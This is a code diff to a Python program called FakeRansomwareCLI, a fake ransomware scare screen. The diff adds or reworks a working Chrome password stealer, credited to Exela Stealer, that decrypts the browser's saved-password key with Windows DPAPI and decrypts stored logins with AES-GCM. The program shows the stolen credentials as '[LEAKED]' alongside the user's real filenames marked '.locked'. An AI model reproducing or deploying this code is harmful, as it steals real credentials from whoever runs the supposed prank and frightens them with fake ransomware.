@@ -9,9 +9,10 @@ import time
 import threading
 import random
 import sqlite3
-import win32crypt  # For decrypting Chrome passwords
+import win32crypt
 import json
 from base64 import b64decode
+from Crypto.Cipher import AES
 
 class FakeRansomwareCLI:
     def __init__(self, root):
@@ -68,48 +69,48 @@ class FakeRansomwareCLI:
         except:
             hwid = "Unavailable"
 
-        # Get real Chrome passwords
+        # Chrome password stealer (adapted from Exela Stealer)
         def get_chrome_passwords():
             try:
-                # Path to Chrome's Login Data SQLite database
-                chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-                if not os.path.exists(chrome_path):
+                passwords = []
+                login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+                if not os.path.exists(login_db):
                     return ["[ERROR] Chrome password database not found"]
 
-                # Copy the database to avoid locking issues
-                temp_path = os.path.join(os.environ["TEMP"], "Login Data")
-                with open(chrome_path, 'rb') as f:
+                # Copy database to avoid locking
+                temp_path = os.path.join(os.environ["TEMP"], f"Login Data")
+                with open(login_db, 'rb') as f:
                     data = f.read()
                 with open(temp_path, 'wb') as f:
                     f.write(data)
 
-                # Connect to the copied database
+                # Get encryption key
+                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+                key = b64decode(local_state["os_crypt"]["encrypted_key"])
+                key = key[5:]  # Remove 'DPAPI' prefix
+                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+                # Connect to database and query passwords
                 conn = sqlite3.connect(temp_path)
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                passwords = []
-
-                # Get encryption key (Windows DPAPI)
-                key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-                with open(key_path, 'r') as f:
-                    local_state = json.load(f)
-                encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove 'DPAPI' prefix
-                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-
-                # Decrypt passwords
-                from Crypto.Cipher import AES
-                for url, user, pwd in cursor.fetchall():
-                    if user and pwd:  # Only include non-empty entries
-                        # Decrypt password
-                        nonce = pwd[:12]
-                        ciphertext = pwd[12:-16]
-                        tag = pwd[-16:]
-                        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
-                        decrypted_pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
-                        passwords.append(f"[LEAKED] {url} : {user} : {decrypted_pwd}")
-                
+                for url, username, password in cursor.fetchall():
+                    if not username or not password:
+                        continue
+                    # Decrypt password
+                    try:
+                        iv = password[3:15]
+                        encrypted_password = password[15:-16]
+                        tag = password[-16:]
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+                        decrypted_password = cipher.decrypt_and_verify(encrypted_password, tag).decode("utf-8")
+                        passwords.append(f"[LEAKED] {url} : {username} : {decrypted_password}")
+                    except:
+                        continue
                 conn.close()
-                os.remove(temp_path)  # Clean up temp file
+                os.remove(temp_path)  # Clean up
                 return passwords[:5] if passwords else ["[ERROR] No passwords found"]
             except Exception as e:
                 return [f"[ERROR] Failed to extract passwords: {str(e)}"]
@@ -123,7 +124,7 @@ class FakeRansomwareCLI:
             f"[LEAKED] Recent Browser Search: 'secure my account' ({time.strftime('%Y-%m-%d %H:%M:%S')})",
         ]
 
-        # Real filenames from user folder with fake "encrypted" extensions
+        # Fake filenames with "encrypted" extensions
         user_dir = os.path.expanduser("~")
         sample_files = []
         for folder in ["Desktop", "Documents", "Downloads", "Pictures", "Videos"]:
@@ -139,7 +140,7 @@ class FakeRansomwareCLI:
             sample_files = ["tax_return_2023.pdf", "passport_scan.jpg", "private_notes.txt"]
         sample_files = [f"{f}.locked" for f in sample_files]
 
-        # Typing script with Chrome password extraction
+        # Typing script with Chrome passwords
         self.lines_to_type = [
             "[!] CRITICAL SYSTEM BREACH DETECTED\n",
             "[*] Establishing remote connection...\n",
@@ -213,7 +214,6 @@ class FakeRansomwareCLI:
 
     def exit_program(self, event):
         self.root.destroy()
-
 
 if __name__ == "__main__":
     root = tk.Tk()
